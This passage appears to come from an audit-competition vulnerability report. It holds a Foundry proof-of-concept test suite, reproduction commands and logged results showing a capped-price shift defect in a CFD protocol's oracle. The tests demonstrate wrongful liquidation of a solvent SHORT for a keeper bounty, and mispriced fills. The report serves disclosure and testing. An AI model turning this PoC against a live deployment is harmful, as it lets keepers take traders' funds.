    /// @dev Thursday live market: SHORT 10,000 lots at 1.99 (zero confidence, so entry is exactly 1.99), then the
    ///      basket rises above CAP and a public mark refresh installs the capped mark.
    function _openShortThenLiftBasketAboveCap(
        uint256 margin
    ) internal {
        vm.warp(THURSDAY_LIVE);
        assertFalse(engine.isFadWindow(), "Thursday is not FAD");
        assertFalse(engine.isOracleFrozen(), "Thursday is not frozen");
        _refreshMark(ENTRY_PRICE, 0);

        (, Vm.Log[] memory logs) =
            _commitAndExecute(shortTrader, CfdTypes.Side.SHORT, SIZE, margin, false, ENTRY_PRICE, 0);
        (uint256 openPrice,, bool found) = _engineEventPrice(logs, ICfdEngineTypes.PositionOpened.selector, shortTrader);
        assertTrue(found, "short opened");
        assertEq(openPrice, ENTRY_PRICE, "short entry is exactly 1.99");
        assertEq(engine.positionEntryCostAssetAtoms(shortTrader), LOTS * ENTRY_PRICE, "exact entry basis");

        vm.warp(vm.getBlockTimestamp() + 600);
        _refreshMark(RAW_ABOVE_CAP, CONF_ABOVE_CAP);
        assertEq(engine.lastMarkPrice(), CAP_PRICE, "neutral mark is capped");
        (bool accepted, uint256 acceptedMark,) = pletherOracle.getAcceptedBasketMark();
        assertTrue(accepted, "live basket accepted");
        assertEq(acceptedMark, CAP_PRICE, "accepted live basket is above CAP");
    }

    function _orderRequest(
        CfdTypes.Side side,
        bool isClose,
        uint64 commitTime
    ) internal pure returns (IPletherOracle.OrderExecutionRequest memory request) {
        request.commitTime = commitTime;
        request.targetPrice = 1;
        request.side = side;
        request.isClose = isClose;
        request.revertOnHistoricalUnavailable = true;
    }

    // ---------------------------------------------------------------------------------------------------------
    // (B) Oracle-level control: same signed tick, fixed live-liquidation quote vs unfixed order quotes
    // ---------------------------------------------------------------------------------------------------------

    function test_B_SameTick_LiveLiquidationQuoteIsFixed_OrderQuotesAreNot() public {
        vm.warp(THURSDAY_LIVE);
        _refreshMark(ENTRY_PRICE, 0);
        vm.warp(vm.getBlockTimestamp() + 10);
        uint64 commitTime = uint64(vm.getBlockTimestamp());
        vm.warp(vm.getBlockTimestamp() + 2);
        bytes[] memory historical = _payload(RAW_ABOVE_CAP, CONF_ABOVE_CAP, commitTime + 1, commitTime);

        uint256 snap = vm.snapshotState();
        // Fixed path (MED-10 fix): live liquidation shifts the RAW basket, then caps.
        vm.prank(address(router));
        IPletherOracle.LiquidationBatchSnapshot memory liq =
            pletherOracle.updateLiquidationBatchPrice(address(router), historical);
        assertEq(liq.markPrice, CAP_PRICE, "neutral mark capped");
        assertEq(liq.shortPrice, CAP_PRICE, "fixed path: SHORT-adverse liquidation price = min(raw - shift, CAP) = CAP");
        assertEq(liq.longPrice, CAP_PRICE, "LONG-adverse liquidation price = CAP");
        vm.revertToState(snap);

        // Unfixed path: order execution caps first, then subtracts the shift (single + batch).
        (bool ok, IPletherOracle.PriceSnapshot memory shortClose) = pletherOracle.updateOrderExecutionPrice(
            address(this), historical, _orderRequest(CfdTypes.Side.SHORT, true, commitTime)
        );
        assertTrue(ok);
        (, IPletherOracle.PriceSnapshot memory longOpen) = pletherOracle.updateOrderExecutionPrice(
            address(this), historical, _orderRequest(CfdTypes.Side.LONG, false, commitTime)
        );
        (, IPletherOracle.PriceSnapshot memory shortOpen) = pletherOracle.updateOrderExecutionPrice(
            address(this), historical, _orderRequest(CfdTypes.Side.SHORT, false, commitTime)
        );
        (, IPletherOracle.PriceSnapshot memory longClose) = pletherOracle.updateOrderExecutionPrice(
            address(this), historical, _orderRequest(CfdTypes.Side.LONG, true, commitTime)
        );
        IPletherOracle.BatchOrderPriceCache memory emptyCache;
        (, IPletherOracle.PriceSnapshot memory batchShortClose, IPletherOracle.BatchOrderPriceCache memory cache) =
        pletherOracle.updateBatchOrderExecutionPrice(
            address(this), historical, _orderRequest(CfdTypes.Side.SHORT, true, commitTime), emptyCache
        );
        (, IPletherOracle.PriceSnapshot memory cachedShortClose,) = pletherOracle.updateBatchOrderExecutionPrice(
            address(this), new bytes[](0), _orderRequest(CfdTypes.Side.SHORT, true, commitTime), cache
        );

        emit log_named_uint("raw basket", RAW_ABOVE_CAP);
        emit log_named_uint("liquidation SHORT price (fixed path)", liq.shortPrice);
        emit log_named_uint("order SHORT close price (single)", shortClose.price);
        emit log_named_uint("order SHORT close price (batch)", batchShortClose.price);
        emit log_named_uint("order SHORT close price (batch cache)", cachedShortClose.price);
        emit log_named_uint("order LONG open price", longOpen.price);
        emit log_named_uint("order SHORT open price", shortOpen.price);
        emit log_named_uint("order LONG close price", longClose.price);

        assertEq(shortClose.markPrice, CAP_PRICE, "neutral mark capped");
        assertEq(shortClose.price, CAP_PRICE - SHIFT, "BUG: SHORT close = CAP - shift although raw - shift > CAP");
        assertEq(batchShortClose.price, CAP_PRICE - SHIFT, "BUG: batch SHORT close identical");
        assertEq(cachedShortClose.price, CAP_PRICE - SHIFT, "BUG: batch cache reuse identical");
        assertEq(longOpen.price, CAP_PRICE - SHIFT, "BUG: LONG open = CAP - shift although raw - shift > CAP");
        assertEq(shortOpen.price, CAP_PRICE, "upward side is re-clamped to CAP (asymmetry)");
        assertEq(longClose.price, CAP_PRICE, "upward side is re-clamped to CAP (asymmetry)");
        assertLt(shortClose.price, liq.shortPrice, "order path is harsher than the fixed liquidation path");
    }

    // ---------------------------------------------------------------------------------------------------------
    // (C) End-to-end: SHORT close through the public Router settles below CAP
    // ---------------------------------------------------------------------------------------------------------

    function test_C_OrderPath_ShortCloseAboveCap_FillsAtCapMinusShift() public {
        _openShortThenLiftBasketAboveCap(60_000e6);

        (, Vm.Log[] memory logs) =
            _commitAndExecute(shortTrader, CfdTypes.Side.SHORT, SIZE, 0, true, RAW_ABOVE_CAP, CONF_ABOVE_CAP);
        (uint256 closePrice, int256 realizedPnl, bool found) =
            _engineEventPrice(logs, ICfdEngineTypes.PositionClosed.selector, shortTrader);
        assertTrue(found, "short closed");
        (uint256 sizeAfter,,,,,,) = engine.positions(shortTrader);
        assertEq(sizeAfter, 0, "fully closed");

        int256 intendedPnl = int256(LOTS * CAP_PRICE) - int256(LOTS * ENTRY_PRICE);
        emit log_named_uint("SHORT close execution price", closePrice);
        emit log_named_int("realized PnL (USDG atoms)", realizedPnl);
        emit log_named_int("PnL at min(raw - shift, CAP) = CAP", intendedPnl);
        emit log_named_int("trader shortfall (USDG atoms)", intendedPnl - realizedPnl);

        assertEq(closePrice, CAP_PRICE - SHIFT, "BUG: SHORT closes at CAP - shift while raw - shift > CAP");
        assertEq(realizedPnl, int256(LOTS * (CAP_PRICE - SHIFT)) - int256(LOTS * ENTRY_PRICE), "pnl at CAP - shift");
        assertEq(intendedPnl - realizedPnl, int256(LOTS * SHIFT), "loss = lots * shift = 500 USDG on 10,000 lots");
    }

    /// @dev A SHORT limit-close whose minimum acceptable price is the policy price CAP can never fill while the basket
    ///      is above CAP + shift: the shifted capped quote (CAP - shift) fails `checkSlippage` and the order is
    ///      terminally rejected, although min(raw - shift, CAP) == CAP.
    function test_E_OrderPath_ShortLimitCloseAtCap_RejectedAsSlippage() public {
        _openShortThenLiftBasketAboveCap(60_000e6);

        vm.prank(shortTrader);
        uint64 orderId = router.commitOrder(CfdTypes.Side.SHORT, SIZE, 0, CAP_PRICE, true);
        uint256 commitTime = vm.getBlockTimestamp();
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(commitTime + 2);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory result =
            router.executeOrder(orderId, _payload(RAW_ABOVE_CAP, CONF_ABOVE_CAP, commitTime + 1, commitTime));
        emit log_named_uint("limit close status", uint8(result.status));
        emit log_named_uint("limit close terminal reason", uint8(result.terminalReason));
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "limit close fails");
        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.Slippage), "rejected as slippage");
        (uint256 sizeAfter,,,,,,) = engine.positions(shortTrader);
        assertEq(sizeAfter, SIZE, "position still open");
    }

    // ---------------------------------------------------------------------------------------------------------
    // (D) End-to-end: LONG open through the public Router enters below CAP (instant mark-to-market loss)
    // ---------------------------------------------------------------------------------------------------------

    function test_D_OrderPath_LongOpenAboveCap_EntersAtCapMinusShift() public {
        _openShortThenLiftBasketAboveCap(60_000e6);

        (, Vm.Log[] memory logs) =
            _commitAndExecute(longTrader, CfdTypes.Side.LONG, SIZE, 60_000e6, false, RAW_ABOVE_CAP, CONF_ABOVE_CAP);
        (uint256 openPrice,, bool found) = _engineEventPrice(logs, ICfdEngineTypes.PositionOpened.selector, longTrader);
        assertTrue(found, "long opened");
        uint256 entryCost = engine.positionEntryCostAssetAtoms(longTrader);
        assertEq(engine.lastMarkPrice(), CAP_PRICE, "neutral mark remains CAP");

        // LONG PnL = entryCost - lots * mark. At the neutral CAP mark the new LONG is immediately under water.
        int256 pnlAtMark = int256(entryCost) - int256(LOTS * CAP_PRICE);
        emit log_named_uint("LONG open execution price", openPrice);
        emit log_named_int("LONG PnL at the neutral CAP mark right after the fill", pnlAtMark);

        assertEq(openPrice, CAP_PRICE - SHIFT, "BUG: LONG opens at CAP - shift while raw - shift > CAP");
        assertEq(entryCost, LOTS * (CAP_PRICE - SHIFT), "entry basis below CAP");
        assertEq(pnlAtMark, -int256(LOTS * SHIFT), "instant loss = lots * shift");
    }

    // ---------------------------------------------------------------------------------------------------------
    // (A) Frozen regime: a SHORT that is solvent at the policy price is liquidated because the frozen basket
    //     shifts the already capped mark
    // ---------------------------------------------------------------------------------------------------------

    function test_A_FrozenLiquidation_ShortSolventAtCapIsLiquidated() public {
        _openShortThenLiftBasketAboveCap(45_000e6);

        // Friday 16:45 New York: FAD-live. FAD margin (3%) applies, oracle is still live.
        vm.warp(FRIDAY_FAD_LIVE);
        assertTrue(engine.isFadWindow(), "FAD window");
        assertFalse(engine.isOracleFrozen(), "not frozen yet");
        _refreshMark(RAW_ABOVE_CAP, CONF_ABOVE_CAP);
        uint64 lastLiveTick = engine.lastMarkTime();
        assertEq(engine.lastMarkPrice(), CAP_PRICE, "capped live mark before the freeze");

        // The SHORT tops up to sit 100 USDG above the 3% FAD requirement at CAP (its max-profit price).
        uint256 reqAtCap = LOTS * CAP_PRICE * 300 / 10_000;
        ICfdEngineTypes.LiquidationPreview memory atCap = engineLens.previewLiquidation(shortTrader, CAP_PRICE);
        assertLt(atCap.equityAssets, int256(reqAtCap + 100e6), "fixture starts below target equity");
        uint256 topUp = reqAtCap + 100e6 - uint256(atCap.equityAssets);
        vm.prank(shortTrader);
        engine.addMargin(shortTrader, topUp);
        atCap = engineLens.previewLiquidation(shortTrader, CAP_PRICE);
        emit log_named_int("equity at CAP after top-up", atCap.equityAssets);
        emit log_named_uint("3% FAD requirement at CAP", reqAtCap);
        assertFalse(atCap.liquidatable, "solvent at CAP");
        (uint256 borrowBase,,) = engine.positionCarryState(shortTrader);
        assertEq(borrowBase, 0, "margin exceeds max profit: no carry can move equity");

        // Control (live, FAD): the fixed liquidation path prices the SHORT at min(raw - shift, CAP) = CAP -> solvent.
        bytes[] memory liveTick = _payload(RAW_ABOVE_CAP, CONF_ABOVE_CAP, lastLiveTick, lastLiveTick - 1);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__PositionIsSolvent.selector);
        vm.prank(keeper);
        router.executeLiquidation(shortTrader, liveTick);

        // Friday 17:00:30 New York: oracle frozen. Nothing about the position or the basket has changed.
        vm.warp(FRIDAY_FROZEN);
        vm.roll(vm.getBlockNumber() + 1);
        assertTrue(engine.isOracleFrozen(), "oracle frozen");
        assertEq(engine.lastMarkTime(), lastLiveTick, "same capped mark");

        uint256 poolAssets = pool.totalAssets();
        bool liquidatableAtCap = engineLens.isLiquidatableAt(shortTrader, CAP_PRICE, poolAssets);
        bool liquidatableAtShifted = engineLens.isLiquidatableAt(shortTrader, CAP_PRICE - SHIFT, poolAssets);
        assertFalse(liquidatableAtCap, "solvent at CAP at the same timestamp");
        assertTrue(liquidatableAtShifted, "liquidatable at CAP - shift at the same timestamp");

        vm.prank(address(router));
        IPletherOracle.PriceSnapshot memory frozenQuote =
            pletherOracle.updateLiquidationPrice(address(router), new bytes[](0), shortTrader);
        vm.prank(address(router));
        IPletherOracle.LiquidationBatchSnapshot memory frozenBatch =
            pletherOracle.updateLiquidationBatchPrice(address(router), new bytes[](0));
        emit log_named_uint("frozen SHORT liquidation price (single)", frozenQuote.price);
        emit log_named_uint("frozen SHORT liquidation price (batch)", frozenBatch.shortPrice);
        assertTrue(frozenQuote.oracleFrozen, "frozen policy");
        assertEq(frozenQuote.markPrice, CAP_PRICE, "neutral frozen mark capped");
        assertEq(frozenQuote.price, CAP_PRICE - SHIFT, "BUG: frozen SHORT price shifts the capped mark");
        assertEq(frozenBatch.shortPrice, CAP_PRICE - SHIFT, "BUG: frozen batch identical");

        // Trader account value at the policy price CAP immediately before the liquidation:
        // total clearinghouse custody (free settlement + pledged margin) + unrealized SHORT profit at CAP.
        uint256 traderValueAtCapBefore =
            clearinghouse.balanceAssets(shortTrader) + (LOTS * CAP_PRICE - engine.positionEntryCostAssetAtoms(shortTrader));
        uint256 keeperBefore = clearinghouse.balanceAssets(keeper);
        uint256 poolBefore = pool.totalAssets();

        vm.recordLogs();
        vm.prank(keeper);
        router.executeLiquidation(shortTrader, new bytes[](0));
        Vm.Log[] memory logs = vm.getRecordedLogs();
        (uint256 liqPrice,, bool found) =
            _engineEventPrice(logs, ICfdEngineTypes.PositionLiquidated.selector, shortTrader);
        assertTrue(found, "short liquidated");
        (uint256 sizeAfter,,,,,,) = engine.positions(shortTrader);
        assertEq(sizeAfter, 0, "wrongful liquidation executed");

        uint256 keeperGain = clearinghouse.balanceAssets(keeper) - keeperBefore;
        uint256 traderValueAfter = clearinghouse.balanceAssets(shortTrader) + engine.traderClaimBalanceAssets(shortTrader);
        uint256 traderLoss = traderValueAtCapBefore - traderValueAfter;
        emit log_named_uint("liquidation price", liqPrice);
        emit log_named_uint("trader account value at CAP before liquidation (USDG atoms)", traderValueAtCapBefore);
        emit log_named_uint("trader account value after liquidation (USDG atoms)", traderValueAfter);
        emit log_named_uint("trader loss caused by the liquidation (USDG atoms)", traderLoss);
        emit log_named_uint("keeper bounty taken from a SHORT solvent at CAP (USDG atoms)", keeperGain);
        emit log_named_int("pool cash change (USDG atoms)", int256(pool.totalAssets()) - int256(poolBefore));
        assertEq(liqPrice, CAP_PRICE - SHIFT, "liquidated at CAP - shift");
        assertGt(keeperGain, 0, "keeper profits from the flip");
        // Loss = full liquidation charge (keeper half + LP half) + price shortfall of lots * shift.
        assertEq(traderLoss, 2 * keeperGain + LOTS * SHIFT, "loss = liquidation charge + lots * shift");
    }

}
```

### Reproduction

Requirements: Git and Foundry. No RPC endpoint is needed. The first build compiles the package with `via_ir` and takes several minutes.

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/audit

# Save the complete Solidity block above as:
# packages/perps/test/audit/Med10FixIncompleteFrozenCap.t.sol

forge test --root packages/perps --match-path 'test/audit/Med10FixIncompleteFrozenCap.t.sol' -vv
```

### Observed result

I ran the command above with Forge `1.5.1-stable` (commit `b0a9dd9ceda36f63e2326ce530c10e6916f4b8a2`) on a clean checkout of the in-scope commit with unmodified `packages/perps/src`. All five tests passed:

```text
Ran 5 tests for test/audit/Med10FixIncompleteFrozenCap.t.sol:Med10FixIncompleteFrozenCapTest
[PASS] test_A_FrozenLiquidation_ShortSolventAtCapIsLiquidated() (gas: 3900120)
Logs:
  equity at CAP after top-up: 60100000000
  3% FAD requirement at CAP: 60000000000
  frozen SHORT liquidation price (single): 199950000
  frozen SHORT liquidation price (batch): 199950000
  liquidation price: 199950000
  trader account value at CAP before liquidation (USDG atoms): 307223750397
  trader account value after liquidation (USDG atoms): 304733750397
  trader loss caused by the liquidation (USDG atoms): 2490000000
  keeper bounty taken from a SHORT solvent at CAP (USDG atoms): 995000000
  pool cash change (USDG atoms): -8505000000

[PASS] test_B_SameTick_LiveLiquidationQuoteIsFixed_OrderQuotesAreNot() (gas: 889594)
Logs:
  raw basket: 200100000
  liquidation SHORT price (fixed path): 200000000
  order SHORT close price (single): 199950000
  order SHORT close price (batch): 199950000
  order SHORT close price (batch cache): 199950000
  order LONG open price: 199950000
  order SHORT open price: 200000000
  order LONG close price: 200000000

[PASS] test_C_OrderPath_ShortCloseAboveCap_FillsAtCapMinusShift() (gas: 4077090)
Logs:
  SHORT close execution price: 199950000
  realized PnL (USDG atoms): 9500000000
  PnL at min(raw - shift, CAP) = CAP: 10000000000
  trader shortfall (USDG atoms): 500000000

[PASS] test_D_OrderPath_LongOpenAboveCap_EntersAtCapMinusShift() (gas: 4606808)
Logs:
  LONG open execution price: 199950000
  LONG PnL at the neutral CAP mark right after the fill: -500000000

[PASS] test_E_OrderPath_ShortLimitCloseAtCap_RejectedAsSlippage() (gas: 3706945)
Logs:
  limit close status: 3
  limit close terminal reason: 3

Suite result: ok. 5 passed; 0 failed; 0 skipped
```

USDG has six decimals, so `2490000000` is 2,490 USDG and `995000000` is 995 USDG. The pool cash change of -8,505 USDG in the first test is the SHORT's realized profit paid out (9,500 USDG) less the LP half of the liquidation charge (995 USDG). In the last test, status `3` is `Failed` and terminal reason `3` is `Slippage`. Gas values can differ by toolchain, and compiler warnings precede this output.

### Configuration notes

The repository's base harness (`test/perps/BasePerpTest.sol`) does not use the release configuration, so the test sets it and asserts it in `setUp`:

- Risk parameters from DEPLOYMENT.md "Initial release parameters": `vpiFactor 0.01e18`, `maxSkewRatio 0.4e18`, `maintMarginBps 10`, `initMarginBps 20`, `fadMarginBps 300`, `baseCarryBps 500`, `minBountyAssets 1e6`, `bountyBps 10`, `keeperShareBps 5000`, `protocolShareBps 0`.
- Senior limits `40,000,000 USDG` and `8000 bps`, and the release Router/oracle policy (`adverseConfidenceMultiplierBps 2500`, `minOpenNotionalAssets 1000e6`, `maxPendingOrders 5`, protection trigger bounty 0.20 USDG), each applied through the real 72-hour timelock. `basketMaxConfidenceRatioBps 10`, `executionFeeBps 4` and `CAP_PRICE 2e8` are asserted.
- Tranche seeds of 1 USDG each.

Remaining differences from a release deployment, none of which affects the defect:

- The harness basket has two equally weighted mock feeds instead of six. The affected code runs after basket aggregation and depends only on the aggregate price, the aggregate confidence, `CAP_PRICE` and the oracle regime.
- A 10,000,000 USDG Junior deposit provides pool depth for a 2,000,000 USDG position.
- Orders are committed through the repository's test adapter `LegacyOrderRouterHarness`, which builds a production V3 `OrderRequest` and enters the production commit path. Mark refresh, order execution, liquidation and all oracle calls use the production entrypoints.

I also reproduced the same three outcomes on a six-feed basket built from the release deployment wrappers with the production `commitOrder(OrderRequest)` entrypoint (a SHORT close filled at `199,979,987` while the live liquidation quote on the same tick was `200,000,000`; a frozen batch liquidation of a SHORT with 60,100 USDG equity against a 60,000 USDG requirement). That variant needs a fixture of about 1,200 lines and is left out to keep this report self-contained; I can provide it on request.

